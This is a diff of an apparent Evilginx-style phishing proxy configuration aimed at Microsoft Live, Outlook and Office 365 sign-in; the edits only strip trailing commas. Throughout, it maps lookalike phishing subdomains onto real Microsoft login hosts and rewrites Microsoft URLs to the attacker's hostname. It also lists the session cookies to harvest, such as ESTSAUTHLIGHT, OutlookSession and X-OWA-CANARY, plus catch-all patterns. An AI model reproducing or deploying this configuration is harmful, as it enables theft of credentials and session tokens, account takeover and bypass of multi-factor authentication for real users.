@@ -5,91 +5,91 @@ proxy_hosts:
       orig_sub: "outlook",
       domain: "live.com",
       session: true,
-      is_landing: true,
+      is_landing: true
     }
   - {
       phish_sub: "live",
       orig_sub: "login",
       domain: "live.com",
       session: true,
-      is_landing: false,
+      is_landing: false
     }
   - {
       phish_sub: "account",
       orig_sub: "account",
       domain: "live.com",
       session: true,
-      is_landing: false,
+      is_landing: false
     }
   - {
       phish_sub: "login",
       orig_sub: "login",
       domain: "microsoftonline.com",
       session: true,
-      is_landing: false,
+      is_landing: false
     }
   - {
       phish_sub: "office365",
       orig_sub: "outlook",
       domain: "office365.com",
       session: true,
-      is_landing: false,
+      is_landing: false
     }
   - {
       phish_sub: "autologon",
       orig_sub: "autologon",
       domain: "microsoftazuread-sso.com",
       session: true,
-      is_landing: false,
+      is_landing: false
     }
   - {
       phish_sub: "mcasproxy",
       orig_sub: "mcasproxy",
       domain: "azureedge.net",
       session: true,
-      is_landing: false,
+      is_landing: false
     }
   - {
       phish_sub: "outlook-us",
       orig_sub: "outlook",
       domain: "office365.com.us3.cas.ms",
       session: true,
-      is_landing: false,
+      is_landing: false
     }
   - {
       phish_sub: "outlook-1",
       orig_sub: "outlook-1",
       domain: "cdn.office.net.us3.cas.ms",
       session: true,
-      is_landing: false,
+      is_landing: false
     }
   - {
       phish_sub: "login",
       orig_sub: "login",
       domain: "office365.com.us3.cas.ms",
       session: true,
-      is_landing: false,
+      is_landing: false
     }
   - {
       phish_sub: "browser",
       orig_sub: "browser.pipe.aria",
       domain: "microsoft.com.us3.cas.ms",
       session: true,
-      is_landing: false,
+      is_landing: false
     }
   - {
       phish_sub: "bitcdemo-com",
       orig_sub: "bitcdemo-com",
       domain: "prod05.access-control.cas.ms",
       session: true,
-      is_landing: false,
+      is_landing: false
     }
   - {
       phish_sub: "aadcdn",
       orig_sub: "",
       domain: "aadcdn.msftauth.net",
       session: true,
-      is_landing: false,
+      is_landing: false
     }
 
 sub_filters:
@@ -99,7 +99,7 @@ sub_filters:
       domain: "live.com",
       search: "https://login.live.com",
       replace: "https://{hostname}",
-      mimes: ["text/html", "application/json", "application/javascript"],
+      mimes: ["text/html", "application/json", "application/javascript"]
     }
   - {
       triggers_on: "login.live.com",
@@ -107,7 +107,7 @@ sub_filters:
       domain: "live.com",
       search: "https://login.live.com/ppsecure/",
       replace: "https://{hostname}/ppsecure/",
-      mimes: ["text/html", "application/json", "application/javascript"],
+      mimes: ["text/html", "application/json", "application/javascript"]
     }
   - {
       triggers_on: "login.live.com",
@@ -115,7 +115,7 @@ sub_filters:
       domain: "live.com",
       search: "https://login.live.com/GetCredentialType.srf",
       replace: "https://{hostname}/GetCredentialType.srf",
-      mimes: ["text/html", "application/json", "application/javascript"],
+      mimes: ["text/html", "application/json", "application/javascript"]
     }
   - {
       triggers_on: "login.live.com",
@@ -123,7 +123,7 @@ sub_filters:
       domain: "live.com",
       search: "https://login.live.com/GetSessionState.srf",
       replace: "https://{hostname}/GetSessionState.srf",
-      mimes: ["text/html", "application/json", "application/javascript"],
+      mimes: ["text/html", "application/json", "application/javascript"]
     }
   - {
       triggers_on: "login.live.com",
@@ -132,7 +132,7 @@ sub_filters:
       search: "https://outlook.live.com",
       replace: "https://{hostname}",
       mimes: ["text/html", "application/json", "application/javascript"],
-      redirect_only: true,
+      redirect_only: true
     }
   - {
       triggers_on: "login.microsoftonline.com",
@@ -140,7 +140,7 @@ sub_filters:
       domain: "microsoftonline.com",
       search: "https://login.microsoftonline.com",
       replace: "https://{hostname}",
-      mimes: ["text/html", "application/json", "application/javascript"],
+      mimes: ["text/html", "application/json", "application/javascript"]
     }
   - {
       triggers_on: "outlook.live.com",
@@ -148,7 +148,7 @@ sub_filters:
       domain: "live.com",
       search: "https://outlook.live.com",
       replace: "https://{hostname}",
-      mimes: ["text/html", "application/json", "application/javascript"],
+      mimes: ["text/html", "application/json", "application/javascript"]
     }
   - {
       triggers_on: "aadcdn.msftauth.net",
@@ -156,7 +156,7 @@ sub_filters:
       domain: "aadcdn.msftauth.net",
       search: "https://aadcdn.msftauth.net",
       replace: "https://{hostname}",
-      mimes: ["text/html", "application/json", "application/javascript"],
+      mimes: ["text/html", "application/json", "application/javascript"]
     }
 
 auth_tokens:
@@ -170,7 +170,7 @@ auth_tokens:
         "CCState:always",
         "CcsSharedSignInState:always",
         "SignInStateCookie:always",
-        ".*,regexp",
+        ".*,regexp"
       ]
   - domain: "login.microsoftonline.com"
     keys: ["ESTSAUTHLIGHT:always", "x-ms-gateway-slice:always", ".*,regexp"]
@@ -181,7 +181,7 @@ auth_tokens:
         "UC:always",
         "OutlookSession:always",
         "X-OWA-CANARY:always",
-        ".*,regexp",
+        ".*,regexp"
       ]
   - domain: ".login.live.com"
     keys:
@@ -198,7 +198,7 @@ auth_tokens:
         "MSPRequ:always",
         "MSPSoftVis:always",
         "OParams:always",
-        ".*,regexp",
+        ".*,regexp"
       ]
 
 auth_urls:
